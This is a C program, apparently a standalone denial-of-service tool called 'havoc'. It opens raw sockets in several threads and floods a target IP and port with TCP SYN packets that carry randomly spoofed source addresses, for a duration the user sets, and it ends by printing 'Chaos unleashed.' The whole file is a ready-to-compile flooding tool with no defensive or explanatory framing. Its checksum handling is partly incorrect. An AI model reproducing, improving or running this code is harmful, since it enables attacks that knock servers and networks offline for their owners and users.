#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>

// IP Header
struct ipheader {
    unsigned char      iph_ihl:5, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_flag:3, iph_offset:13;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// TCP Header
struct tcpheader {
    unsigned short int tcph_srcport;
    unsigned short int tcph_destport;
    unsigned int       tcph_seqnum;
    unsigned int       tcph_acknum;
    unsigned char      tcph_reserved:4, tcph_offset:4;
    unsigned char      tcph_flags;
    unsigned short int tcph_win;
    unsigned short int tcph_chksum;
    unsigned short int tcph_urgptr;
};

// Checksum Calculation
unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void usage() {
    printf("Usage: ./havoc ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char packet[4096];
    struct ipheader *ip = (struct ipheader *) packet;
    struct tcpheader *tcp = (struct tcpheader *) (packet + sizeof(struct ipheader));
    time_t endtime;

    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);
    
    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        // Fill IP Header
        ip->iph_ihl = 5;
        ip->iph_ver = 4;
        ip->iph_tos = 0;
        ip->iph_len = sizeof(struct ipheader) + sizeof(struct tcpheader);
        ip->iph_ident = htons(rand());
        ip->iph_ttl = 255;
        ip->iph_protocol = IPPROTO_TCP;
        ip->iph_sourceip = rand(); // Random IP
        ip->iph_destip = inet_addr(data->ip);

        // Fill TCP Header
        tcp->tcph_srcport = htons(rand() % 65535);
        tcp->tcph_destport = htons(data->port);
        tcp->tcph_seqnum = rand();
        tcp->tcph_acknum = 0;
        tcp->tcph_flags = TH_SYN;
        tcp->tcph_win = htons(65535);
        tcp->tcph_chksum = 0;
        tcp->tcph_urgptr = 0;

        // Compute TCP checksum
        tcp->tcph_chksum = csum((unsigned short *)packet, sizeof(struct ipheader) + sizeof(struct tcpheader));

        // Send the packet
        if (sendto(sock, packet, ip->iph_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Havoc started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: Havoc %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Havoc finished. Chaos unleashed.\n");
    return 0;
}
